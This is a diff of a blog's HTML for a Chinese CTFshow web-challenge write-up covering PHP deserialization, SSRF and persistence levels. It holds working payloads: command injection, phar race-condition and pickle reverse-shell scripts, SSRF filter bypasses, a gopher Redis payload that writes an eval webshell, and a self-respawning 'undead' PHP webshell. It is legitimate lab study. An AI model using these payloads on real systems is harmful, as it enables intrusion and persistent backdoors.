 <pre><code class="highlight plaintext">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;1&quot;;s:2:&quot;to&quot;;s:1:&quot;2&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre>
-
 <p>base64加密后得到</p>
 <pre><code class="highlight plaintext">Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiYSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxOiIyIjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</code></pre>
-
 <p>直接传也可以得到flag</p>
-<h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><p>进来是一个登录界面，懵了一下，果断请他吃我一扫</p>
+<h3 id="web263"><a class="markdownIt-Anchor" href="#web263"></a> web263</h3>
+<p>进来是一个登录界面，懵了一下，果断请他吃我一扫</p>
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250717163049318.png" alt="image-20250717163049318"></p>
-<h3 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web264"><a class="markdownIt-Anchor" href="#web264"></a> web264</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 
 <span class="comment">/*</span>
 <span class="comment"># -*- coding: utf-8 -*-</span>
@@ -1249,12 +1357,12 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 &#125;
 
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</code></pre>
-
 <p>怎么感觉，似曾相识啊。</p>
 <p>但是把之前那题能直接改msg的非预期修掉了。</p>
 <p>所以直接用上上题的poc</p>
 <p>但是由于它不自带msg,你需要抓包改一下Cookie加一个msg,什么值随意</p>
-<h3 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web265"><a class="markdownIt-Anchor" href="#web265"></a> web265</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 
 <span class="comment">/*</span>
 <span class="comment"># -*- coding: utf-8 -*-</span>
@@ -1289,8 +1397,7 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 <span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;
     <span class="keyword">echo</span> <span class="variable">$flag</span>;
 &#125;</code></pre>
-
-<p>感觉是一个md5绕过，马上想起来<strong>Error&#x2F;Exception</strong>原生类是可以绕过哈希的，但是这里用不到</p>
+<p>感觉是一个md5绕过，马上想起来<strong>Error/Exception</strong>原生类是可以绕过哈希的，但是这里用不到</p>
 <p>仔细想想，要token和password相等，这里必须要token动password也动</p>
 <p>那么用&amp;试一下行不行</p>
 <pre><code class="highlight php"><span class="meta">&lt;?php</span>
@@ -1304,9 +1411,9 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();
 <span class="variable">$a</span>-&gt;password=&amp;<span class="variable">$a</span>-&gt;token;
 <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</code></pre>
-
 <p>直接就得到flag了</p>
-<h3 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web266"><a class="markdownIt-Anchor" href="#web266"></a> web266</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 
 <span class="comment">/*</span>
 <span class="comment"># -*- coding: utf-8 -*-</span>
@@ -1347,7 +1454,6 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;
     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);
 &#125;</code></pre>
-
 <p>这里只要不抛错就能得到正常的结果</p>
 <p>这边正则没有用模糊匹配(i)的模式，直接大小写绕过即可</p>
 <pre><code class="highlight php"><span class="meta">&lt;?php</span>
@@ -1358,7 +1464,6 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 <span class="variable">$ctfshowo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();
 <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfshowo</span>);
 <span class="comment">//把结果的ctfshow任意改一个字母为大写即可</span></code></pre>
-
 <p>并且这边即使什么都不写也是可以的，必定会<code>__destruct</code>，利用PHP<strong>函数名和类名不区分大小写，变量名区分</strong>的特性</p>
 <pre><code class="highlight php"><span class="meta">&lt;?php</span>
 
@@ -1370,8 +1475,9 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 <span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));
 
 <span class="meta">?&gt;</span></code></pre>
-
-<h3 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h3><h3 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web267"><a class="markdownIt-Anchor" href="#web267"></a> web267</h3>
+<h3 id="web275"><a class="markdownIt-Anchor" href="#web275"></a> web275</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 
@@ -1413,21 +1519,19 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 &#125;<span class="keyword">else</span>&#123;
     <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;
 &#125;</code></pre>
-
 <p>感觉是拼接字符串命令执行</p>
 <p><strong>POC1</strong></p>
 <pre><code class="highlight plaintext">/?fn=;tac flag.php</code></pre>
-
 <p>做完看源码在思考,能不能写一个马进去呢。。</p>
 <pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;</span>);
 <span class="meta">?&gt;</span>
 <span class="comment">//filename=1.pthml</span></code></pre>
-
 <p>但是最后没写进去，用命令拼接发现是有文件写入权限的，不懂了</p>
 <p>然后发现自己犯了个很弱智的错误</p>
 <p>这个马还没访问就被删除拿头执行啊。。</p>
-<h3 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web276"><a class="markdownIt-Anchor" href="#web276"></a> web276</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 
 <span class="comment">/*</span>
 <span class="comment"># -*- coding: utf-8 -*-</span>
@@ -1482,7 +1586,6 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 &#125;<span class="keyword">else</span>&#123;
     <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;
 &#125;</code></pre>
-
 <p>增加了一个<code>admin</code>的认证</p>
 <p>并且这里你拿这个admin没办法的。。</p>
 <p>思路是phar反序列化，但是由于源码会删除文件，那么就要用条件竞争来玩一玩了。</p>
@@ -1513,7 +1616,6 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();
 
 <span class="meta">?&gt;</span></code></pre>
-
 <pre><code class="highlight python"><span class="comment">#encoding=gbk</span>
 <span class="keyword">import</span> threading
 <span class="keyword">import</span> requests
@@ -1534,13 +1636,12 @@ flag = <span class="literal">True</span>
 <span class="keyword">while</span> flag:
     threading.Thread(target = write).start()
     threading.Thread(target = unserialize).start()</code></pre>
-
 <p>脚本是[这位师傅](<a target="_blank" rel="noopener" href="https://blog.csdn.net/Myon5/article/details/143657655">ctfshow-web入门-反序列化（web271-web278）_ctfshow web271-CSDN博客</a>)的！</p>
 <p>这里跑了半天才跑出来</p>
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250723174915266.png" alt="image-20250723174915266"></p>
-<h3 id="web277"><a href="#web277" class="headerlink" title="web277"></a>web277</h3><p>看看源码注释</p>
+<h3 id="web277"><a class="markdownIt-Anchor" href="#web277"></a> web277</h3>
+<p>看看源码注释</p>
 <pre><code class="highlight html"><span class="comment">&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span></code></pre>
-
 <p>pickle反序列化来的</p>
 <p>简单到不行的pickle</p>
 <pre><code class="highlight python"><span class="keyword">import</span> pickle
@@ -1551,12 +1652,14 @@ flag = <span class="literal">True</span>
 obj = a()
 code=pickle.dumps(obj)
 <span class="built_in">print</span>(base64.b64encode(code))</code></pre>
-
 <p>直接弹shell，flag就在根目录下(问就是无回显)</p>
-<h3 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h3><p>题目提示过滤了os.system</p>
+<h3 id="web278"><a class="markdownIt-Anchor" href="#web278"></a> web278</h3>
+<p>题目提示过滤了os.system</p>
 <p>然鹅这和我们并没有任何关系</p>
 <p>继续弹</p>
-<h2 id="SSRF-Complete"><a href="#SSRF-Complete" class="headerlink" title="SSRF(Complete)"></a>SSRF(Complete)</h2><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h2 id="ssrfcomplete"><a class="markdownIt-Anchor" href="#ssrfcomplete"></a> SSRF(Complete)</h2>
+<h3 id="web351"><a class="markdownIt-Anchor" href="#web351"></a> web351</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 <span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
@@ -1567,9 +1670,9 @@ code=pickle.dumps(obj)
 <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
 <span class="keyword">echo</span> (<span class="variable">$result</span>);
 <span class="meta">?&gt;</span></code></pre>
-
 <p>直接访问提示非本地用户禁止访问，既然是SSRF那就是在URL里输入<code>127.0.0.1/flag.php</code></p>
-<h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web352"><a class="markdownIt-Anchor" href="#web352"></a> web352</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 <span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
@@ -1591,15 +1694,13 @@ code=pickle.dumps(obj)
     <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
 &#125;
 <span class="meta">?&gt;</span> hacker</code></pre>
-
 <pre><code class="highlight plaintext">parse_url这个是用来处理URL的，把它解析成各个部分后存储到数组里面
 并且要求头为http/https
 问题来了它这个正则写的一拓实，没waf一样</code></pre>
-
 <p><code>flag.php</code>一如既往的非本地无法访问,直接加个头就行</p>
 <pre><code class="highlight plaintext">http://127.0.0.1/flag.php</code></pre>
-
-<h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web353"><a class="markdownIt-Anchor" href="#web353"></a> web353</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 <span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
@@ -1621,17 +1722,15 @@ code=pickle.dumps(obj)
     <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
 &#125;
 <span class="meta">?&gt;</span> hacker</code></pre>
-
 <p>对味</p>
 <p>那我要用邪门一点的方式来绕过了</p>
 <pre><code class="highlight plaintext">http://127.1/flag.php</code></pre>
-
 <p>对于形式这样的ip<code>x.0.0.1</code>可以直接缩写为<code>x.1</code></p>
 <p>同时也可以进制替换</p>
 <pre><code class="highlight plaintext">127.0.0.0/8是一个环回地址网段，从127.0.0.1 ~ 127.255.255.254都表示localhost
 也就是说http://127.1.1.1/flag.php其实也可以的</code></pre>
-
-<h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web354"><a class="markdownIt-Anchor" href="#web354"></a> web354</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 <span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
@@ -1653,30 +1752,31 @@ code=pickle.dumps(obj)
     <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
 &#125;
 <span class="meta">?&gt;</span></code></pre>
-
 <p>这里主要的数字都waf了</p>
 <p>那么可以有下面几种想法:</p>
 <pre><code class="highlight plaintext">域名指向127
 302跳转
 DNS-Rebinding</code></pre>
-
 <ul>
-<li><ol>
+<li>
+<ol>
 <li>在自己的域名里添加一条A记录指向<code>127.0.0.1</code></li>
 </ol>
 </li>
-<li><ol start="2">
+<li>
+<ol start="2">
 <li>在自己的网站页面添加</li>
 </ol>
 </li>
-<li><ol start="3">
+<li>
+<ol start="3">
 <li>自己去ceye.io注册绑定<code>127.0.0.1</code>然后记得前面加r</li>
 </ol>
 </li>
 </ul>
 <pre><code class="highlight plaintext">url=http://r.xxxzc8.ceye.io/flag.php</code></pre>
-
-<h3 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web355"><a class="markdownIt-Anchor" href="#web355"></a> web355</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 <span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
@@ -1699,10 +1799,10 @@ DNS-Rebinding</code></pre>
     <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
 &#125;
 <span class="meta">?&gt;</span></code></pre>
-
 <p>将主机名限制到5位以内，那用缩写格式就行</p>
 <p><code>127.1或者0(其实就是0.0.0.0)</code></p>
-<h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web356"><a class="markdownIt-Anchor" href="#web356"></a> web356</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 <span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
@@ -1725,9 +1825,9 @@ DNS-Rebinding</code></pre>
     <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
 &#125;
 <span class="meta">?&gt;</span></code></pre>
-
 <p>限制到3位以内，127用不了了0可以</p>
-<h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web357"><a class="markdownIt-Anchor" href="#web357"></a> web357</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 <span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
@@ -1746,7 +1846,6 @@ DNS-Rebinding</code></pre>
     <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);
 &#125;
 <span class="meta">?&gt;</span></code></pre>
-
 <p>不是很懂。。</p>
 <pre><code class="highlight plaintext">gethostbyname:成功时返回 IPv4 地址，失败时返回主机名。
 filter_var() 函数通过指定的过滤器过滤一个变量。
@@ -1754,20 +1853,18 @@ FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）。
 FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）。
 FILTER_FLAG_NO_PRIV_RANGE - 要求值不在 RFC 指定的私有范围 IP 内（比如 192.168.0.1）。
 FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</code></pre>
-
 <p>也就是说这里会验证URL的IP地址不在RFC指定的<code>私有IP</code>范围内（比如 192.168.0.1），且要求值不在<code>保留的IP</code>范围内。</p>
 <p>使用DNS重绑定或者用自己的服务器打302</p>
 <p>这里可以用第一个，因为有个快捷的网站</p>
 <pre><code class="highlight plaintext">https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg</code></pre>
-
 <p>可以直接重绑定，你输一个不会触发内网ip验证的就可以，发包三次就可以拿到flag</p>
 <pre><code class="highlight plaintext">分别是:127.0.0.1 ip!
 1.1.1.1（我重绑定的ip
 1.1.1.1 flag</code></pre>
-
 <p>为什么是三次?我也不知道，调试一下看看好了</p>
 <p>但是怪就怪在我自己调是只有爆ip的，出不来。。</p>
-<h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web358"><a class="markdownIt-Anchor" href="#web358"></a> web358</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 <span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
@@ -1775,27 +1872,25 @@ FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接�
 <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;
     <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);
 &#125;</code></pre>
-
 <p>要用<code>http://ctf</code>开头<code>show</code>结尾</p>
 <p>这里利用@</p>
 <pre><code class="highlight plaintext">在URL中，@符号通常用于在基本认证（Basic Authentication）中，将用户名和密码包含在URL中。这种用法的格式是：
 http://username:password@hostname/path
 在这个格式中，username:password 是登录所需的凭据，@ 符号用来分隔凭据和主机名。然而，这种做法在现代网络应用中不推荐使用，因为它容易导致安全问题，比如泄露用户凭据。</code></pre>
-
 <pre><code class="highlight plaintext">POC:
 url=http://ctf.com@127.0.0.1/flag.php#show
 url=http://ctf.com@127.0.0.1/flag.php?show</code></pre>
-
-<h3 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h3><pre><code class="highlight plaintext">打无密码的mysql</code></pre>
-
+<h3 id="web359"><a class="markdownIt-Anchor" href="#web359"></a> web359</h3>
+<pre><code class="highlight plaintext">打无密码的mysql</code></pre>
 <p>随便输一下转到<code>check.php</code></p>
 <p>看到<code>POST:returl=https://404.chall.ctf.show/&amp;u=admin</code></p>
 <p>那看来这边可以写马发gopher包了</p>
 <p>这里介绍一个工具<code>gopherus</code><a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus.git">https://github.com/tarunkant/Gopherus.git</a></p>
-<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250710143949440.png" alt="image-20250710143949440"></p>
+<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250710143949440.png" alt="image-20250710143949440"></p>
 <p><code>_</code>后面的部分记得二次URL编码(因为发送过去时会被编码一次)</p>
 <p>写入成功直接连即可</p>
-<h3 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web360"><a class="markdownIt-Anchor" href="#web360"></a> web360</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 <span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
@@ -1806,26 +1901,24 @@ url=http://ctf.com@127.0.0.1/flag.php?show</code></pre>
 <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
 <span class="keyword">echo</span> (<span class="variable">$result</span>);
 <span class="meta">?&gt;</span></code></pre>
-
 <p>看似平平无奇，实则暗藏杀机。。</p>
 <p><code>file://</code>协议读不出东西</p>
 <p>尝试用<code>dict://</code>探测一下端口</p>
 <p>最后发现redis的端口是开放的</p>
 <pre><code class="highlight plaintext">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5Bcmd%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre>
-
 <p>记得把<code>_</code>后边编码</p>
 <p>接着POST一下，这里不知道为什么POST会卡住然后报错504</p>
 <p>但是shell.php是存在的，不知道为什么啊。。希望有大佬可以解答一下</p>
 <p>最后直接命令执行即可，喜欢蚁剑也可以</p>
-<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="web670"><a href="#web670" class="headerlink" title="web670"></a>web670</h3><pre><code class="highlight plaintext">system(&#x27;echo &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot; &gt;shell.php&#x27;);
+<h2 id="权限维持"><a class="markdownIt-Anchor" href="#权限维持"></a> 权限维持</h2>
+<h3 id="web670"><a class="markdownIt-Anchor" href="#web670"></a> web670</h3>
+<pre><code class="highlight plaintext">system(&#x27;echo &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot; &gt;shell.php&#x27;);
 var_dump(getcwd()); =&gt;/var/www/html</code></pre>
-
 <p>之后发现无法连上</p>
 <p><code>cmd=system(&quot;tac shell.php&quot;);</code>一看没有内容啊。。</p>
 <p>看了下其他师傅的博客感觉我思路错了，这里是用<code>file_put_contents</code>来执行</p>
 <pre><code class="highlight plaintext">cmd=file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;);
 在源码里可以看到成功写入</code></pre>
-
 <p>但是连不上啊。。后来找了原因发现要在蚁剑里设置忽略https证书</p>
 <p>然后check发现把目录清光了。。</p>
 <p>草拟吗不死马，来</p>
@@ -1840,9 +1933,7 @@ var_dump(getcwd()); =&gt;/var/www/html</code></pre>
         <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);
     &#125;
 <span class="meta">?&gt;</span></code></pre>
-
 <pre><code class="highlight php"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;17.php&#x27;</span>, <span class="string">&#x27;&lt;?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = \&#x27;shell.php\&#x27;;$code = \&#x27;&lt;?php @eval($_POST[1]);?&gt;\&#x27;;while (1) &#123;file_put_contents($file, $code);usleep(5000);&#125;?&gt;&#x27;</span>);</code></pre>
-
 <p>解析一下</p>
 <pre><code class="highlight plaintext">set_time_limit()函数：设置允许脚本运行的时间，单位为秒（如果设置该运行时间，sleep()函数在执行程序时的持续时间将会被忽略掉）
 ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行（如果设置为True或者1，则忽略与用户的断开）
@@ -1850,67 +1941,122 @@ unlink(FILE)函数：删除文件（防止文件落地被检测工具查杀）
 file_put_contents函数：将一个字符串写入该文件中
 usleep函数：延迟执行当前脚本数微秒，即条件竞争</code></pre>
 
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ayan0.top">AyaN0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ayan0.top/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/">https://ayan0.top/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://ayan0.top" target="_blank">Blog of AyaN0</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web-CTF-WriteUp/">-Web -CTF -WriteUp</a></div><div class="post-share"><div class="social-share" data-image="/img/ari.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="author-info-name">AyaN0</div><div class="author-info-description">”如果是你的话，是否会选择继续前进呢"</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/kisakiayano" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1594453512@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客喵</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E9%9D%A2%E5%BF%98%E4%BA%86%EF%BC%8C%E5%90%8E%E9%9D%A2%E5%BF%98%E4%BA%86%EF%BC%8C%E8%AE%B0%E5%BD%95%E4%B8%8B%E5%B0%B1%E5%AF%B9%E4%BA%86"><span class="toc-text">前面忘了，后面忘了，记录下就对了</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Complete"><span class="toc-text">信息收集(Complete)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web01"><span class="toc-text">web01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web02"><span class="toc-text">web02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web03"><span class="toc-text">web03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web04"><span class="toc-text">web04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web05"><span class="toc-text">web05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web06"><span class="toc-text">web06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web07"><span class="toc-text">web07</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web08"><span class="toc-text">web08</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web09"><span class="toc-text">web09</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web10"><span class="toc-text">web10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web11"><span class="toc-text">web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web12"><span 